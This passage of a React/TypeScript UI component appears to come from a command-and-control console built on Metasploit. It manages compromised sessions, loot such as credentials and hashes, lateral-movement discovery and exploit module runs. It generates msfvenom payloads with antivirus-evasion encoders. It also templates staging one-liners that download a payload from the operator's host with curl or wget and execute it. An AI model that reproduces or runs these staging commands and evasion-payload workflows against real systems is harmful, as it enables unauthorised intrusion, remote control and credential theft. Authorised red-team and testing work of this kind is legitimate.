      if (res.ok) {
        const entries: LootEntry[] = await res.json()
        setLoot(entries)
        const probeEntry = entries.find(
          e => e.loot_type === 'system_info' && e.session_id === sid &&
               e.captured_at >= startedAt
        )
        if (probeEntry) {
          setProbeOutput(probeEntry.content + '\n\n[+] Saved to Loot tab.')
          clearInterval(poll)
          setProbing(false)
          await loadChecklist(sid)
          return
        }
      }
      if (ticks >= 11) {  // 11 × 8s = 88s
        clearInterval(poll)
        setProbing(false)
        setProbeOutput('Auto-probe timed out — check Loot tab for results.')
      }
    }, 8000)
  }

  async function handleLateralDiscover() {
    if (!activeSession) return
    setDiscoveringLateral(true)
    try {
      const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/lateral-discover`, { method: 'POST' })
      if (res.ok) setLateralResult(await res.json())
    } finally {
      setDiscoveringLateral(false)
    }
  }

  async function handleParseSysinfo() {
    if (!activeSession || !sysinfoRaw.trim()) return
    setParsingSysinfo(true)
    try {
      const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/sysinfo`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ raw_output: sysinfoRaw }),
      })
      if (res.ok) {
        // Refresh session list so sysinfo panel updates
        const sesRes = await fetch(`/api/v1/c2/sessions?project_id=${selectedProject}`)
        if (sesRes.ok) {
          const updated: C2Session[] = await sesRes.json()
          setSessions(updated)
          const refreshed = updated.find(s => s.id === activeSession.id)
          if (refreshed) setActiveSession(refreshed)
        }
        setSysinfoRaw('')
      }
    } finally {
      setParsingSysinfo(false)
    }
  }

  function copyText(text: string, key: string) {
    navigator.clipboard.writeText(text)
    setCopied(key)
    setTimeout(() => setCopied(''), 2000)
  }

  const LOOT_COLORS: Record<string, string> = {
    credential: 'text-amber-400 border-amber-500/30 bg-amber-950/30',
    hash: 'text-red-400 border-red-500/30 bg-red-950/30',
    file: 'text-blue-400 border-blue-500/30 bg-blue-950/30',
    key: 'text-purple-400 border-purple-500/30 bg-purple-950/30',
    secret: 'text-orange-400 border-orange-500/30 bg-orange-950/30',
    system_info: 'text-cyan-400 border-cyan-500/30 bg-cyan-950/20',
  }

  const inputClass = "bg-[#05080d] border border-cyan-900/30 rounded px-3 py-2 text-sm text-slate-200 focus:outline-none focus:border-cyan-500/50 w-full"

  return (
    <div className="flex h-full gap-4 overflow-hidden">
      {/* Left panel */}
      <div className="w-72 flex-shrink-0 flex flex-col gap-3 min-h-0">

        {/* MSF Connection status */}
        <div className={`glass rounded-xl p-4 border ${msfStatus.connected ? 'border-green-500/20' : 'border-red-500/20'}`}>
          <div className="flex items-center gap-2 mb-3">
            {msfStatus.connected
              ? <Wifi size={16} className="text-green-400" />
              : <WifiOff size={16} className="text-red-400" />
            }
            <span className="text-sm font-semibold text-slate-200">Metasploit RPC</span>
            {msfStatus.connected && (
              <span className="ml-auto text-xs font-mono text-green-400">v{msfStatus.version}</span>
            )}
          </div>

          {msfStatus.connected ? (
            <div className="grid grid-cols-2 gap-2">
              <div className="bg-[#05080d] rounded-lg p-2 text-center border border-cyan-900/20">
                <div className="text-xl font-bold font-mono text-cyan-400">{msfStatus.sessions}</div>
                <div className="text-[10px] text-slate-500">Sessions</div>
              </div>
              <div className="bg-[#05080d] rounded-lg p-2 text-center border border-cyan-900/20">
                <div className="text-xl font-bold font-mono text-amber-400">{msfStatus.jobs}</div>
                <div className="text-[10px] text-slate-500">Jobs</div>
              </div>
            </div>
          ) : (
            <div className="space-y-2">
              <div className="grid grid-cols-2 gap-2">
                <div>
                  <label className="text-[10px] text-slate-500 mb-1 block">Host</label>
                  <input value={msfHost} onChange={e => setMsfHost(e.target.value)} className={inputClass} placeholder="127.0.0.1" />
                </div>
                <div>
                  <label className="text-[10px] text-slate-500 mb-1 block">Port</label>
                  <input value={msfPort} onChange={e => setMsfPort(e.target.value)} className={inputClass} placeholder="55553" />
                </div>
              </div>
              <div>
                <label className="text-[10px] text-slate-500 mb-1 block">Password</label>
                <input type="password" value={msfPass} onChange={e => setMsfPass(e.target.value)} className={inputClass} placeholder="msfrpcd password" />
              </div>
              {connectError && <p className="text-xs text-red-400">{connectError}</p>}
              <button
                onClick={handleConnect}
                disabled={connecting}
                className="w-full py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 disabled:opacity-50 text-sm text-white font-medium transition-all hover:shadow-glow-cyan"
              >
                {connecting ? 'Connecting...' : 'Connect to MSF'}
              </button>
            </div>
          )}
        </div>

        {/* Project selector */}
        <div className="glass glass-hover rounded-xl p-4">
          <label className="text-xs text-slate-500 mb-2 block">Project</label>
          <select className={inputClass} value={selectedProject} onChange={e => setSelectedProject(e.target.value)}>
            <option value="">Select project...</option>
            {projects.map(p => <option key={p.id} value={p.id}>{p.name}</option>)}
          </select>
        </div>

        {/* Session list */}
        <div className="glass rounded-xl flex-1 flex flex-col min-h-0 overflow-hidden">
          <div className="px-4 py-3 border-b border-cyan-900/20 flex-shrink-0 flex items-center justify-between">
            <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Sessions</span>
            <div className="flex gap-1">
              <button onClick={handleSync} disabled={loading || !msfStatus.connected} title="Sync from MSF" className="text-slate-500 hover:text-cyan-400 transition-colors p-1 disabled:opacity-40">
                <RefreshCw size={13} className={loading ? 'animate-spin' : ''} />
              </button>
            </div>
          </div>
          <div className="overflow-y-auto flex-1">
            {sessions.length === 0 ? (
              <div className="text-center text-slate-600 py-8 px-4 text-xs">
                <Shield size={28} className="mx-auto mb-2 opacity-20" />
                No sessions yet. Sync from MSF or add manually.
              </div>
            ) : sessions.map(s => (
              <div
                key={s.id}
                onClick={() => setActiveSession(s)}
                className={`flex items-start gap-3 px-4 py-3 cursor-pointer border-b border-cyan-900/10 transition-colors ${
                  activeSession?.id === s.id ? 'bg-cyan-900/10 border-l-2 border-l-cyan-500' : 'hover:bg-cyan-950/10'
                }`}
              >
                <TerminalIcon size={14} className={`mt-0.5 flex-shrink-0 ${s.status === 'active' && s.live ? 'text-green-400' : s.status === 'lost' ? 'text-red-400' : 'text-slate-600'}`} />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center justify-between gap-2">
                    <span className="text-xs font-mono text-slate-200 truncate">
                      {s.remote_host || 'unknown'}
                      {s.msf_session_id && <span className="text-slate-600 ml-1">#{s.msf_session_id}</span>}
                    </span>
                    <div className="flex items-center gap-1.5">
                      <SessionStatusBadge status={s.status} live={s.live} />
                      <button
                        onClick={e => { e.stopPropagation(); handleKillSession(s) }}
                        className="text-slate-600 hover:text-red-400 transition-colors"
                        title="Kill & delete session"
                      >
                        <X size={12} />
                      </button>
                    </div>
                  </div>
                  <div className="text-[10px] text-slate-500 mt-0.5">{s.session_type} · {s.platform || '?'} · {s.arch || '?'}</div>
                  {s.via_exploit && <div className="text-[10px] text-slate-600 truncate">{s.via_exploit}</div>}
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Main panel */}
      <div className="flex-1 flex flex-col min-w-0 min-h-0">
        {/* Tabs */}
        <div className="flex items-center gap-2 mb-3 flex-shrink-0">
          <div className="flex gap-1 glass rounded-lg p-1">
            {([
              { id: 'sessions', icon: <TerminalIcon size={13} />, label: 'Console' },
              { id: 'payloads', icon: <Package size={13} />, label: 'Payloads' },
              { id: 'listeners', icon: <Radio size={13} />, label: 'Listeners' },
              { id: 'attack', icon: <Crosshair size={13} />, label: 'Attack Plan' },
              { id: 'loot', icon: <Database size={13} />, label: `Loot (${loot.length})` },
            { id: 'postex', icon: <ListChecks size={13} />, label: 'Post-Ex' },
            { id: 'lotl', icon: <BookOpen size={13} />, label: 'LOTL' },
            ] as const).map(tab => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-1.5 px-3 py-1.5 rounded text-xs font-medium transition-colors ${
                  activeTab === tab.id ? 'bg-cyan-600 text-white shadow-glow-cyan' : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                {tab.icon} {tab.label}
              </button>
            ))}
          </div>
          {activeSession && (
            <div className="ml-auto flex items-center gap-2 text-xs">
              <span className="font-mono text-cyan-400" style={{ textShadow: '0 0 8px rgba(6,182,212,0.4)' }}>
                {activeSession.remote_host}:{activeSession.remote_port}
              </span>
              <span className="text-slate-600">·</span>
              <span className="text-slate-400">{activeSession.session_type}</span>
              <button onClick={() => handleKillSession(activeSession)} className="text-slate-600 hover:text-red-400 transition-colors ml-2" title="Kill session">
                <X size={14} />
              </button>
            </div>
          )}
        </div>

        {/* Console tab */}
        {activeTab === 'sessions' && (
          <div className="flex-1 flex gap-3 min-h-0">
            {/* Terminal */}
            <div className="flex-1 flex flex-col min-h-0">
              {activeSession ? (
                <>
                  <Terminal ref={terminalRef} className="flex-1 rounded-xl overflow-hidden border border-cyan-900/20 shadow-glow-cyan" />
                  {/* Command input */}
                  <div className="flex gap-2 mt-2 flex-shrink-0">
                    <div className="flex items-center gap-2 flex-1 glass rounded-lg px-3 py-2 border border-cyan-900/30">
                      <span className="text-green-400 font-mono text-xs flex-shrink-0">seraph@c2 &gt;</span>
                      <input
                        ref={inputRef}
                        value={termInput}
                        onChange={e => setTermInput(e.target.value)}
                        onKeyDown={e => { if (e.key === 'Enter') sendCommand() }}
                        placeholder="Enter command..."
                        className="flex-1 bg-transparent text-sm text-slate-200 focus:outline-none font-mono placeholder-slate-700"
                        autoFocus
                      />
                    </div>
                    <button onClick={sendCommand} className="px-3 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white transition-all hover:shadow-glow-cyan flex-shrink-0">
                      <ChevronRight size={16} />
                    </button>
                  </div>
                </>
              ) : (
                <div className="flex-1 glass rounded-xl border border-cyan-900/20 flex flex-col items-center justify-center text-slate-600">
                  <TerminalIcon size={40} className="mb-3 opacity-20 text-cyan-600" />
                  <p className="text-sm">Select a session from the left to open a console</p>
                  <p className="text-xs mt-1 text-slate-700">or sync active sessions from Metasploit</p>
                </div>
              )}
            </div>

            {/* Post-exploitation sidebar */}
            {activeSession && (
              <div className="w-64 flex-shrink-0 flex flex-col gap-2 min-h-0">
                {/* Sysinfo panel */}
                {activeSession.sysinfo && (
                  <div className="glass rounded-xl overflow-hidden flex-shrink-0 border border-cyan-900/20">
                    <div className="px-3 py-2 border-b border-cyan-900/20 flex items-center justify-between">
                      <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-1.5">
                        <Shield size={10} className="text-cyan-500" /> Host Info
                      </span>
                      {activeSession.sysinfo.is_admin && (
                        <span className="text-[10px] font-bold text-yellow-400 bg-yellow-900/30 px-1.5 py-0.5 rounded">ADMIN</span>
                      )}
                    </div>
                    <div className="p-2 space-y-1 text-[11px] font-mono">
                      {activeSession.sysinfo.hostname && (
                        <div className="flex gap-1.5">
                          <span className="text-slate-600 w-16 flex-shrink-0">hostname</span>
                          <span className="text-cyan-300 truncate">{activeSession.sysinfo.hostname}</span>
                        </div>
                      )}
                      {activeSession.sysinfo.os && (
                        <div className="flex gap-1.5">
                          <span className="text-slate-600 w-16 flex-shrink-0">os</span>
                          <span className="text-slate-300 truncate" title={activeSession.sysinfo.os}>{activeSession.sysinfo.os}</span>
                        </div>
                      )}
                      {activeSession.sysinfo.arch && (
                        <div className="flex gap-1.5">
                          <span className="text-slate-600 w-16 flex-shrink-0">arch</span>
                          <span className="text-slate-300">{activeSession.sysinfo.arch}</span>
                        </div>
                      )}
                      {activeSession.sysinfo.username && (
                        <div className="flex gap-1.5">
                          <span className="text-slate-600 w-16 flex-shrink-0">user</span>
                          <span className="text-green-300 truncate" title={activeSession.sysinfo.username}>{activeSession.sysinfo.username}</span>
                        </div>
                      )}
                      {activeSession.sysinfo.domain && (
                        <div className="flex gap-1.5">
                          <span className="text-slate-600 w-16 flex-shrink-0">domain</span>
                          <span className="text-purple-300 truncate">{activeSession.sysinfo.domain}</span>
                        </div>
                      )}
                    </div>
                  </div>
                )}
                {/* Module buttons */}
                <div className="glass rounded-xl overflow-hidden flex flex-col" style={{ maxHeight: '240px' }}>
                  <div className="px-3 py-2 border-b border-cyan-900/20 flex-shrink-0">
                    <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Post Modules</span>
                  </div>
                  <div className="overflow-y-auto p-2 space-y-1">
                    {postModules.map(mod => {
                      const isRunning = postHistory.some(e => e.label === mod.label && e.running)
                      return (
                        <button
                          key={mod.name}
                          onClick={() => handleRunPostModule(mod)}
                          disabled={isRunning}
                          title={mod.description}
                          className="w-full text-left px-3 py-2 rounded-lg text-xs text-slate-300 hover:bg-cyan-950/20 hover:text-cyan-300 border border-transparent hover:border-cyan-900/30 transition-all flex items-center gap-2 group disabled:opacity-50"
                        >
                          {isRunning
                            ? <RefreshCw size={11} className="text-cyan-500 animate-spin flex-shrink-0" />
                            : <Zap size={11} className="text-slate-600 group-hover:text-cyan-500 flex-shrink-0" />}
                          <span className="truncate">{mod.label}</span>
                        </button>
                      )
                    })}
                  </div>
                </div>

                {/* Run history */}
                {postHistory.length > 0 && (
                  <div className="glass rounded-xl overflow-hidden flex flex-col flex-1 min-h-0">
                    <div className="px-3 py-2 border-b border-cyan-900/20 flex-shrink-0 flex items-center justify-between">
                      <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Results</span>
                      <button onClick={() => setPostHistory([])} className="text-slate-600 hover:text-red-400 transition-colors" title="Clear history">
                        <X size={11} />
                      </button>
                    </div>
                    <div className="overflow-y-auto flex-1 divide-y divide-cyan-900/10">
                      {postHistory.map(entry => (
                        <div key={entry.id} className="text-xs">
                          <button
                            onClick={() => setExpandedHistory(prev => {
                              const n = new Set(prev)
                              n.has(entry.id) ? n.delete(entry.id) : n.add(entry.id)
                              return n
                            })}
                            className="w-full flex items-center gap-2 px-3 py-2 hover:bg-cyan-950/10 transition-colors text-left"
                          >
                            {entry.running
                              ? <RefreshCw size={10} className="text-cyan-400 animate-spin flex-shrink-0" />
                              : entry.error
                                ? <span className="w-2 h-2 rounded-full bg-red-500 flex-shrink-0" />
                                : <span className="w-2 h-2 rounded-full bg-green-500 flex-shrink-0" />}
                            <span className="flex-1 truncate text-slate-300">{entry.label}</span>
                            <span className="text-slate-600 flex-shrink-0">{entry.ts.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'})}</span>
                          </button>
                          {expandedHistory.has(entry.id) && (
                            <div className="px-3 pb-2 space-y-2">
                              {(() => {
                                const leads = entry.output
                                  ? entry.output.split('\n').filter(l => l.startsWith('[+]'))
                                  : []
                                return leads.length > 0 && !entry.running ? (
                                  <div className="rounded-lg border border-green-800/40 bg-green-950/20 p-2 space-y-1">
                                    <div className="text-[10px] font-semibold text-green-400 uppercase tracking-wider mb-1">
                                      {leads.length} Lead{leads.length !== 1 ? 's' : ''}
                                    </div>
                                    {leads.map((l, i) => {
                                      const match = l.match(/exploit\/[\w/]+/)
                                      const module = match ? match[0] : null
                                      const desc = l.replace(/\[\+\]\s*[\d\.]+\s*-\s*(exploit\/[\w/]+)?\s*:?\s*/, '').trim()
                                      return (
                                        <div key={i} className="flex items-start gap-1.5">
                                          <span className="text-green-500 flex-shrink-0 mt-0.5">›</span>
                                          <div className="min-w-0">
                                            {module && (
                                              <div className="flex items-center gap-1">
                                                <span className="text-[10px] font-mono text-green-300 truncate">{module}</span>
                                                <button
                                                  onClick={() => { navigator.clipboard.writeText(module); setCopied(module) }}
                                                  className="text-slate-600 hover:text-green-400 flex-shrink-0 transition-colors"
                                                  title="Copy module path"
                                                >
                                                  {copied === module ? <span className="text-[9px] text-green-400">✓</span> : <Copy size={9} />}
                                                </button>
                                              </div>
                                            )}
                                            <span className="text-[9px] text-slate-400">{desc}</span>
                                          </div>
                                        </div>
                                      )
                                    })}
                                  </div>
                                ) : null
                              })()}
                              {entry.running
                                ? <span className="text-slate-500 italic">Running…</span>
                                : entry.error
                                  ? <span className="text-red-400">{entry.error}</span>
                                  : entry.output
                                    ? <pre className="text-[10px] text-slate-300 whitespace-pre-wrap break-all max-h-48 overflow-y-auto font-mono leading-relaxed">{entry.output}</pre>
                                    : <span className="text-slate-600 italic">No output</span>}
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        )}

        {/* Payloads tab */}
        {activeTab === 'payloads' && (
          <div className="flex-1 overflow-y-auto space-y-4">
            <div className="glass rounded-xl p-5 border border-cyan-900/20">
              <h3 className="text-sm font-semibold text-slate-200 mb-4 flex items-center gap-2">
                <Package size={14} className="text-cyan-400" /> Generate Payload (msfvenom)
              </h3>
              <div className="grid grid-cols-2 gap-4">
                <div className="col-span-2">
                  <label className="text-xs text-slate-500 mb-1 block">Payload</label>
                  <select className={inputClass} style={{ background: '#05080d' }} value={selPayload} onChange={e => {
                    setSelPayload(e.target.value)
                    const p = payloads.find(x => x.value === e.target.value)
                    if (p) setPayloadFmt(p.formats[0])
                  }}>
                    <option value="">Select payload...</option>
                    {payloads.map(p => <option key={p.value} value={p.value}>{p.label}</option>)}
                  </select>
                </div>
                <div>
                  <label className="text-xs text-slate-500 mb-1 block">LHOST</label>
                  <input value={lhost} onChange={e => setLhost(e.target.value)} className={inputClass} placeholder="192.168.1.100" />
                </div>
                <div>
                  <label className="text-xs text-slate-500 mb-1 block">LPORT</label>
                  <input value={lport} onChange={e => setLport(e.target.value)} className={inputClass} placeholder="4444" />
                </div>
                <div>
                  <label className="text-xs text-slate-500 mb-1 block">Format</label>
                  <select className={inputClass} style={{ background: '#05080d' }} value={payloadFmt} onChange={e => setPayloadFmt(e.target.value)}>
                    {(payloads.find(p => p.value === selPayload)?.formats || ['elf','exe','raw']).map(f => (
                      <option key={f} value={f}>{f}</option>
                    ))}
                  </select>
                </div>
                {/* Evasion options */}
                <div className="col-span-2 border-t border-cyan-900/20 pt-3 mt-1">
                  <div className="text-xs text-slate-500 mb-2 font-medium">Evasion Options</div>
                  <div className="grid grid-cols-3 gap-3">
                    <div>
                      <label className="text-xs text-slate-500 mb-1 block">Encoder</label>
                      <select className={inputClass} style={{ background: '#05080d' }} value={payloadEncoder} onChange={e => setPayloadEncoder(e.target.value)}>
                        <option value="none">None</option>
                        <optgroup label="x86">
                          <option value="x86/shikata_ga_nai">shikata_ga_nai (polymorphic)</option>
                          <option value="x86/countdown">countdown</option>
                          <option value="x86/jmp_call_additive">jmp_call_additive</option>
                          <option value="x86/fnstenv_mov">fnstenv_mov</option>
                          <option value="x86/bloxor">bloxor (xor)</option>
                          <option value="x86/alpha_upper">alpha_upper (alphanumeric)</option>
                          <option value="x86/alpha_mixed">alpha_mixed (alphanumeric)</option>
                        </optgroup>
                        <optgroup label="x64">
                          <option value="x64/xor">xor</option>
                          <option value="x64/xor_dynamic">xor_dynamic</option>
                          <option value="x64/zutto_dekiru">zutto_dekiru</option>
                        </optgroup>
                        <optgroup label="cmd">
                          <option value="cmd/powershell_base64">powershell_base64</option>
                        </optgroup>
                      </select>
                    </div>
                    <div>
                      <label className="text-xs text-slate-500 mb-1 block">Iterations</label>
                      <input
                        type="number"
                        min="1"
                        max="20"
                        value={payloadIterations}
                        onChange={e => setPayloadIterations(e.target.value)}
                        disabled={payloadEncoder === 'none'}
                        className={inputClass + ' disabled:opacity-40'}
                        placeholder="1"
                      />
                    </div>
                    <div>
                      <label className="text-xs text-slate-500 mb-1 block">Bad chars</label>
                      <input
                        value={payloadBadChars}
                        onChange={e => setPayloadBadChars(e.target.value)}
                        className={inputClass}
                        placeholder="\x00\x0a"
                      />
                    </div>
                  </div>
                </div>
                <div className="col-span-2 flex items-center gap-2 pt-1">
                  <input
                    id="auto-listener"
                    type="checkbox"
                    checked={autoStartListener}
                    onChange={e => setAutoStartListener(e.target.checked)}
                    className="w-3.5 h-3.5 accent-cyan-500 cursor-pointer"
                  />
                  <label htmlFor="auto-listener" className="text-xs text-slate-400 cursor-pointer select-none">
                    Auto-start listener after generating
                  </label>
                </div>
                <div className="flex items-end">
                  <button
                    onClick={handleGeneratePayload}
                    disabled={generatingPayload || !selPayload || !lhost}
                    className="w-full py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 disabled:opacity-40 text-sm text-white font-medium transition-all hover:shadow-glow-cyan flex items-center justify-center gap-2"
                  >
                    {generatingPayload ? <RefreshCw size={14} className="animate-spin" /> : <Download size={14} />}
                    {generatingPayload ? 'Generating...' : 'Download Payload'}
                  </button>
                </div>
              </div>

              {/* One-liner staging commands */}
              {selPayload && lhost && lport && (
                <div className="mt-4 space-y-2">
                  <div className="text-xs text-slate-500 mb-2">Quick staging commands:</div>
                  {[
                    { label: 'Python HTTP server', cmd: `python3 -m http.server 8080` },
                    { label: 'curl download', cmd: `curl http://${lhost}:8080/payload.${payloadFmt} -o /tmp/p && chmod +x /tmp/p && /tmp/p` },
                    { label: 'wget download', cmd: `wget http://${lhost}:8080/payload.${payloadFmt} -O /tmp/p && chmod +x /tmp/p && /tmp/p` },
                  ].map(item => (
                    <div key={item.label} className="flex items-center gap-2 bg-[#05080d] rounded-lg px-3 py-2 border border-cyan-900/20">
                      <span className="text-[10px] text-slate-600 w-28 flex-shrink-0">{item.label}</span>
                      <code className="flex-1 text-xs font-mono text-slate-300 truncate">{item.cmd}</code>
                      <button onClick={() => copyText(item.cmd, item.label)} className="text-slate-600 hover:text-cyan-400 flex-shrink-0">
                        {copied === item.label ? <Check size={12} className="text-green-400" /> : <Copy size={12} />}
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {/* Listeners tab */}
        {activeTab === 'listeners' && (
          <div className="flex-1 overflow-y-auto space-y-4">
            {/* Start listener form */}
            <div className="glass rounded-xl p-5 border border-cyan-900/20">
              <h3 className="text-sm font-semibold text-slate-200 mb-4 flex items-center gap-2">
                <Radio size={14} className="text-cyan-400" /> Start Listener (multi/handler)
              </h3>
              <div className="grid grid-cols-3 gap-3 items-end">
                <div className="col-span-3">
                  <label className="text-xs text-slate-500 mb-1 block">Payload</label>
                  <select className={inputClass} style={{ background: '#05080d' }} value={listenerPayload} onChange={e => setListenerPayload(e.target.value)}>
                    {payloads.map(p => <option key={p.value} value={p.value}>{p.label}</option>)}
                  </select>
                </div>
                <div>
                  <label className="text-xs text-slate-500 mb-1 block">LHOST</label>
                  <input value={listenerLhost} onChange={e => setListenerLhost(e.target.value)} className={inputClass} placeholder="0.0.0.0" />
                </div>
                <div>
                  <label className="text-xs text-slate-500 mb-1 block">LPORT</label>
                  <input value={listenerLport} onChange={e => setListenerLport(e.target.value)} className={inputClass} placeholder="4444" />
                </div>
                <button
                  onClick={handleStartListener}
                  disabled={startingListener || !msfStatus.connected}
                  className="py-2 rounded-lg bg-green-600 hover:bg-green-500 disabled:opacity-40 text-sm text-white font-medium transition-all flex items-center justify-center gap-2"
                >
                  {startingListener ? <RefreshCw size={14} className="animate-spin" /> : <Play size={14} />}
                  Start
                </button>
              </div>
            </div>

            {/* Active listeners */}
            <div className="glass rounded-xl overflow-hidden border border-cyan-900/20">
              <div className="px-4 py-3 border-b border-cyan-900/20 flex items-center justify-between">
                <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">
                  Active Jobs & Listeners {listeners.length > 0 && <span className="text-cyan-400 ml-1">({listeners.length})</span>}
                </span>
                <div className="flex items-center gap-3">
                  {msfStatus.connected && (
                    <button
                      onClick={async () => {
                        await fetch('/api/v1/c2/jobs/all', { method: 'DELETE' })
                        loadListeners()
                      }}
                      className="text-[11px] text-red-500 hover:text-red-300 transition-colors flex items-center gap-1"
                      title="Kill all MSF jobs"
                    >
                      <X size={11} /> Kill All
                    </button>
                  )}
                  <button onClick={loadListeners} className="text-slate-600 hover:text-cyan-400 transition-colors">
                    <RefreshCw size={13} />
                  </button>
                </div>
              </div>
              {listeners.length === 0 ? (
                <div className="text-center text-slate-600 py-8 text-xs">No active listeners</div>
              ) : listeners.map(l => (
                <div key={l.job_id} className="flex items-center gap-4 px-4 py-3 border-b border-cyan-900/10 hover:bg-cyan-950/10">
                  <span className="relative flex h-2 w-2">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75" />
                    <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500" />
                  </span>
                  <div className="flex-1">
                    <div className="text-xs text-slate-200">{l.name}</div>
                    <div className="text-[10px] text-slate-500 font-mono">
                      {l.datastore?.PAYLOAD} · {l.datastore?.LHOST}:{l.datastore?.LPORT}
                    </div>
                  </div>
                  <span className="text-[10px] text-slate-600">Job #{l.job_id}</span>
                  <button onClick={() => handleStopListener(l.job_id)} className="text-slate-600 hover:text-red-400 transition-colors">
                    <X size={14} />
                  </button>
                </div>
              ))}
            </div>

            {/* Sliver C2 section */}
            <SliverPanel />
          </div>
        )}

        {/* Attack Plan tab */}
        {activeTab === 'attack' && (
          <div className="flex-1 flex flex-col min-h-0 gap-3 overflow-y-auto">
            {/* Header */}
            <div className="glass rounded-xl p-4 border border-cyan-900/20 flex items-center justify-between gap-4 flex-shrink-0">
              <div>
                <h3 className="text-sm font-semibold text-slate-200 flex items-center gap-2">
                  <Crosshair size={14} className="text-red-400" /> Attack Plan
                </h3>
                <p className="text-xs text-slate-500 mt-0.5">
                  Maps scan findings to Metasploit modules using CVE lookups and service fingerprinting.
                </p>
              </div>
              <div className="flex items-center gap-3 flex-shrink-0">
                {attackPlan && (
                  <span className="text-xs text-slate-500">
                    {attackPlan.matched_count} match{attackPlan.matched_count !== 1 ? 'es' : ''} from {attackPlan.finding_count} findings
                  </span>
                )}
                <button
                  onClick={handleGenerateAttackPlan}
                  disabled={generatingAttack || !selectedProject}
                  className="flex items-center gap-2 px-4 py-2 rounded-lg bg-red-700/80 hover:bg-red-600 disabled:opacity-40 text-sm text-white font-medium transition-all"
                  style={{ boxShadow: '0 0 10px rgba(239,68,68,0.2)' }}
                >
                  {generatingAttack
                    ? <><RefreshCw size={13} className="animate-spin" /> Scanning...</>
                    : <><Crosshair size={13} /> {attackPlan ? 'Refresh' : 'Analyze'}</>
                  }
                </button>
              </div>
            </div>

            {attackPlanError && (
              <p className="text-xs text-red-400 bg-red-950/30 border border-red-500/20 rounded-lg px-3 py-2 flex-shrink-0">{attackPlanError}</p>
            )}

            {attackPlan && attackPlan.recommendations.length === 0 && (
              <div className="glass rounded-xl border border-cyan-900/20 flex flex-col items-center justify-center py-12 text-slate-600">
                <Shield size={36} className="mb-3 opacity-20" />
                <p className="text-sm">No matching modules found</p>
                <p className="text-xs mt-1 text-slate-700">Run nmap/nikto scans to discover services and vulnerabilities first</p>
              </div>
            )}

            {attackPlan && attackPlan.recommendations.map((rec, i) => {
              const confColor = rec.confidence === 'high' ? 'text-red-400 border-red-500/30 bg-red-950/20'
                : rec.confidence === 'medium' ? 'text-amber-400 border-amber-500/30 bg-amber-950/20'
                : 'text-slate-400 border-slate-500/30 bg-slate-900/20'
              const sevColor = rec.finding_severity === 'critical' ? 'text-red-400'
                : rec.finding_severity === 'high' ? 'text-orange-400'
                : rec.finding_severity === 'medium' ? 'text-amber-400'
                : 'text-slate-500'
              return (
                <div key={i} className="glass rounded-xl border border-cyan-900/20 p-4 flex-shrink-0">
                  <div className="flex items-start gap-3 mb-3">
                    <span className={`text-[10px] font-bold px-2 py-0.5 rounded border uppercase flex-shrink-0 mt-0.5 ${confColor}`}>
                      {rec.confidence}
                    </span>
                    <div className="flex-1 min-w-0">
                      <code className="text-sm font-mono text-cyan-300">{rec.module}</code>
                      {rec.finding_title && (
                        <p className="text-xs text-slate-500 mt-0.5 truncate">
                          via <span className={`font-medium ${sevColor}`}>{rec.finding_title}</span>
                          <span className="text-slate-700 mx-1">·</span>
                          <span className="text-slate-600">{rec.match_reason}</span>
                        </p>
                      )}
                    </div>
                    <button
                      onClick={() => copyText(rec.module, `mod-${i}`)}
                      className="text-slate-600 hover:text-cyan-400 transition-colors flex-shrink-0"
                      title="Copy module path"
                    >
                      {copied === `mod-${i}` ? <Check size={13} className="text-green-400" /> : <Copy size={13} />}
                    </button>
                  </div>

                  <p className="text-xs text-slate-400 mb-3">{rec.description}</p>

                  {/* Options — editable */}
                  {Object.keys(rec.options).length > 0 && (
                    <div className="bg-[#05080d] rounded-lg p-3 border border-cyan-900/20 mb-3 font-mono text-xs space-y-1.5">
                      <div className="text-slate-600 text-[10px] uppercase tracking-wider mb-2">msf options</div>
                      {Object.entries(rec.options).map(([k, v]) => (
                        <div key={k} className="flex items-center gap-3">
                          <span className="text-cyan-600 w-24 flex-shrink-0">set {k}</span>
                          <input
                            className="flex-1 bg-transparent border-b border-cyan-900/40 focus:border-cyan-500/60 outline-none text-slate-300 py-0.5"
                            defaultValue={v}
                            onChange={e => { rec.options[k] = e.target.value }}
                          />
                        </div>
                      ))}
                      {rec.payload && (
                        <div className="flex items-center gap-3">
                          <span className="text-cyan-600 w-24 flex-shrink-0">set PAYLOAD</span>
                          <input
                            className="flex-1 bg-transparent border-b border-cyan-900/40 focus:border-cyan-500/60 outline-none text-slate-300 py-0.5"
                            defaultValue={rec.payload}
                            onChange={e => { rec.payload = e.target.value }}
                          />
                        </div>
                      )}
                    </div>
                  )}

                  {/* Post modules */}
                  {rec.post_modules.length > 0 && (
                    <div className="flex flex-wrap gap-1.5 mb-3">
                      <span className="text-[10px] text-slate-600 self-center">post:</span>
                      {rec.post_modules.map(pm => (
                        <span key={pm} className="text-[10px] font-mono text-purple-400 bg-purple-950/30 border border-purple-500/20 px-2 py-0.5 rounded">
                          {pm}
                        </span>
                      ))}
                    </div>
                  )}

                  {/* Run button + result */}
                  {!rec.module.startsWith('—') && (
                    <div className="flex flex-col gap-2 pt-1 border-t border-cyan-900/10">
                    <div className="flex items-center gap-3">
                      <button
                        onClick={() => handleRunModule(rec, i)}
                        disabled={!msfStatus.connected || runningModule === i}
                        className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-all disabled:opacity-40
